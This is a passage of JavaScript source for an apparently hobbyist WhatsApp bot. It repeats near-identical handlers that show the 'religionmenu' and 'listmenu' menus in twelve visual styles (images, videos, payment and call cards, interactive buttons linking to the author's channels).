mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'religionmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${religionmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'listmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${listmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./File/theme/rias.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    ToxxicTechInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    ToxxicTechInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    ToxxicTechInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	ToxxicTechInc.sendMessage(m.chat, {
      video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	ToxxicTechInc.sendMessage(m.chat, {
video: fs.readFileSync('./File/theme/RiasMyLove.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363336528578108@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🦊",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"<!> Click To Display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐘𝐨𝐮𝐓𝐮𝐛𝐞 𒆜\",\"url\":\"https://youtube.com/@anime_kun15\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𒈒\",\"url\":\"https://t.me/Toxxicn_bot\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐆𝐢𝐭𝐡𝐮𝐛 𒇫\",\"url\":\"https://github.com/Toxic1239\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𒁂️\",\"url\":\"https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐁𝐎𝐓 𝐒𝐂","id":"${prefix}repo"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"𝐓𝐨𝐱𝐱𝐢𝐜 ☠︎︎","id":"${prefix}toxxic"}`
              }
           ],
          }),
